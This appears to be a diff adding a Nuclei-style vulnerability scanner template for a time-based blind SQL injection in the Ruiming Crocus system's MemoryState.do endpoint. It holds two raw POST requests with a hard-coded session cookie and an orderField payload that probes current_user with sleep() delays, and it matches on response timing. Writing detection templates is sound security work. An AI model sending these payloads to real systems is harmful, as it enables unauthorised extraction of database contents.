@@ -1,0 +1,30 @@
+id: ruiming-Crocus-MemoryState_do-sql-time
+
+info:
+  name: 锐明技术Crocus系统 MemoryState.do SQL注入漏洞
+  author: ruiming
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /MemoryState.do?Action=Query HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: Saffron.U=VUlEPTEmVU49MQ==
+        Content-Type: application/x-www-form-urlencoded
+
+        EndTime=&PageIndex=0&PageSize=20&RepairState=-1&StartTime=&orderField=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep(4),1))a)&orderType=asc
+      - |
+        POST /MemoryState.do?Action=Query HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: Saffron.U=VUlEPTEmVU49MQ==
+        Content-Type: application/x-www-form-urlencoded
+
+        EndTime=&PageIndex=0&PageSize=20&RepairState=-1&StartTime=&orderField=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep(8),1))a)&orderType=asc
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
